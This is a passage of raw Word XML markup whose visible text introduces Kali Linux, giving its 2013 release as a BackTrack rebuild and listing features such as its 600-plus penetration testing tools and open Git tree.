        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Forens</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>cs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>verse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Ka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>nux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>deve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">oped, funded and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ned by O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>ens</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ve Secur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>, a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ead</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nfor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on secur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="1" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="287" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="72" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Ka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>nux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>as</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ased</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>13</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>March,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>2013</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>as</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>op-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>bo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:t>om</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>rebu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>ck</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">rack </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">nux, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>adher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng  co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Deb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>an  dev</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>op</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>t  s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>andards.  Fea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">es </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">are  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ow-</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="3" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>th</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>n 600 penetrat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ng too</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="82"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">e  and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">pen </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>oftw</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="82" w:line="307" w:lineRule="auto"/>
        <w:ind w:left="808" w:right="77" w:hanging="284"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>pen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Gi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ee: </w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>source</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>goes</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Ka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>nux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ava</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>for anyone</w:t>
      </w:r>
      <w:r>
        <w:rPr>
